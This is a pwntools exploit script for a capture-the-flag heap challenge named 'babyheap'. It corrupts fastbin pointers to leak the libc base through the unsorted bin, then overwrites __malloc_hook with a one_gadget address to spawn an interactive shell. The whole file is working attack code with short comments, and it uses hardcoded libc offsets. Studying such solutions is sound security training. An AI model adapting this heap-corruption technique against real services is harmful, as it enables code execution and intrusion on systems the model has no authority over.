from pwn import *
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
if args['DEBUG']:
    context.log_level = 'debug'
context.binary = "./babyheap"
babyheap = context.binary
if args['REMOTE']:
    p = remote('127.0.0.1', 7777)
else:
    p = process("./babyheap")
log.info('PID: ' + str(proc.pidof(p)[0]))


def offset_bin_main_arena(idx):
    word_bytes = context.word_size / 8
    offset = 4  # lock
    offset += 4  # flags
    offset += word_bytes * 10  # offset fastbin
    offset += word_bytes * 2  # top,last_remainder
    offset += idx * 2 * word_bytes  # idx
    offset -= word_bytes * 2  # bin overlap
    return offset


offset_unsortedbin_main_arena = offset_bin_main_arena(0)


def allocate(size):
    p.recvuntil('Command: ')
    p.sendline('1')
    p.recvuntil('Size: ')
    p.sendline(str(size))


def fill(idx, size, content):
    p.recvuntil('Command: ')
    p.sendline('2')
    p.recvuntil('Index: ')
    p.sendline(str(idx))
    p.recvuntil('Size: ')
    p.sendline(str(size))
    p.recvuntil('Content: ')
    p.send(content)


def free(idx):
    p.recvuntil('Command: ')
    p.sendline('3')
    p.recvuntil('Index: ')
    p.sendline(str(idx))


def dump(idx):
    p.recvuntil('Command: ')
    p.sendline('4')
    p.recvuntil('Index: ')
    p.sendline(str(idx))


def exp():
    # 1. leak libc base
    allocate(0x10)  # idx 0, 0x00
    allocate(0x10)  # idx 1, 0x20
    allocate(0x10)  # idx 2, 0x40
    allocate(0x10)  # idx 3, 0x60
    allocate(0x80)  # idx 4, 0x80
    # free idx 1, 2, fastbin[0]->idx1->idx2->NULL
    free(2)
    free(1)
    # edit idx 0 chunk to particial overwrite idx1's fd to point to idx4
    payload = 0x10 * 'a' + p64(0) + p64(0x21) + p8(0x80)
    fill(0, len(payload), payload)
    # if we want to allocate at idx4, we must set it's size as 0x21
    payload = 0x10 * 'a' + p64(0) + p64(0x21)
    fill(3, len(payload), payload)
    allocate(0x10)  # idx 1
    allocate(0x10)  # idx 2, which point to idx4's location
    # if want to free idx4 to unsorted bin, we must fix its size
    payload = 0x10 * 'a' + p64(0) + p64(0x91)
    fill(3, len(payload), payload)
    # allocate a chunk in order when free idx4, idx 4 not consolidate with top chunk
    allocate(0x80)  # idx 5
    free(4)
    # as idx 2 point to idx4, just show this
    dump(2)
    p.recvuntil('Content: \n')
    unsortedbin_addr = u64(p.recv(8))
    main_arena = unsortedbin_addr - offset_unsortedbin_main_arena
    log.success('main arena addr: ' + hex(main_arena))
    main_arena_offset = 0x3c4b20
    libc_base = main_arena - main_arena_offset
    log.success('libc base addr: ' + hex(libc_base))

    # 2. malloc to malloc_hook nearby
    # allocate a 0x70 size chunk same with malloc hook nearby chunk, idx4
    allocate(0x60)
    free(4)
    # edit idx4's fd point to fake chunk
    fake_chunk_addr = main_arena - 0x33
    fake_chunk = p64(fake_chunk_addr)
    fill(2, len(fake_chunk), fake_chunk)

    allocate(0x60)  # idx 4
    allocate(0x60)  # idx 6

    one_gadget_addr = libc_base + 0x4526a
    payload = 0x13 * 'a' + p64(one_gadget_addr)
    fill(6, len(payload), payload)
    # trigger malloc_hook
    allocate(0x100)
    p.interactive()


if __name__ == "__main__":
    exp()
